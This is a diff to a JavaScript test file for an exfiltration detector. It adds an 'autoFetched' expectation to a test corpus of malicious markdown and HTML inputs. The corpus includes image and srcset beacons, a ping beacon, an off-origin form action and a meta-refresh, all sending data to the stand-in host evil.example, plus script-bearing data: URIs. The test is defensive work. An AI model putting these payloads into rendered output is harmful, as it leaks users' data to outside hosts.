@@ -205,30 +205,35 @@ const CORPUS = {
       input: `[c](https://evil.example/t?payload=${"A".repeat(44)})`,
       reason: "suspicious query parameter",
       isImage: false,
+      autoFetched: false,
     },
     {
       name: "image-query-base64",
       input: `![i](https://evil.example/p.png?data=${"A".repeat(44)})`,
       reason: "suspicious query parameter",
       isImage: true,
+      autoFetched: true,
     },
     {
       name: "unparseable-host-flagged-url",
       input: "[x](https://�evil.example/log?token=" + "A".repeat(44) + ")",
       reason: "suspicious query parameter",
       isImage: false,
+      autoFetched: false,
     },
     {
       name: "data-uri-active-image",
       input: "![i](data:text/html;base64,PHNjcmlwdD5ldmlsPC9zY3JpcHQ+)",
       reason: "active-content data: URI",
       isImage: true,
+      autoFetched: true,
     },
     {
       name: "off-origin-form-action",
       input: '<form action="https://evil.example/exfil"><input name=x></form>',
       reason: "off-origin form action",
       isImage: false,
+      autoFetched: true,
     },
     {
       name: "meta-refresh-off-origin",
@@ -236,18 +241,21 @@ const CORPUS = {
         '<meta http-equiv="refresh" content="0; url=https://evil.example/r">',
       reason: "off-origin meta-refresh redirect",
       isImage: false,
+      autoFetched: true,
     },
     {
       name: "srcset-beacon",
       input: `<img srcset="https://evil.example/p.png?data=${"A".repeat(44)} 2x">`,
       reason: "suspicious query parameter",
       isImage: true,
+      autoFetched: true,
     },
     {
       name: "ping-beacon",
       input: `<a href="/ok" ping="https://evil.example/t?exfil=${"A".repeat(44)}">x</a>`,
       reason: "suspicious query parameter",
       isImage: false,
+      autoFetched: true,
     },
     {
       // H6: a srcset candidate URL that itself contains commas (a data: URI)
@@ -257,6 +265,7 @@ const CORPUS = {
       input: `<img srcset="data:image/svg+xml,<svg/onload=x> 2x">`,
       reason: "active-content data: URI",
       isImage: true,
+      autoFetched: true,
     },
   ],
   url: [
@@ -624,12 +633,16 @@ describe("corpus: scripting/resource content survives and is reported", () => {
 });
 
 describe("corpus: exfil links/images are detected, never rewritten", () => {
-  for (const { name, input, reason, isImage } of CORPUS.exfil) {
+  for (const { name, input, reason, isImage, autoFetched } of CORPUS.exfil) {
     it(`flags ${name}`, () => {
       const threats = detectExfil(input);
       assert.notEqual(threats, null, `not flagged: ${name}`);
       assert.equal(threats[0].reason, reason);
       assert.equal(threats[0].isImage, isImage);
+      // `autoFetched` is what the severity tier reads (see output.mjs), and it
+      // is NOT `isImage`: a form action and a meta refresh fire on their own
+      // without being images, while an anchor href does not fire at all.
+      assert.equal(threats[0].autoFetched, autoFetched, `autoFetched: ${name}`);
     });
   }
 });
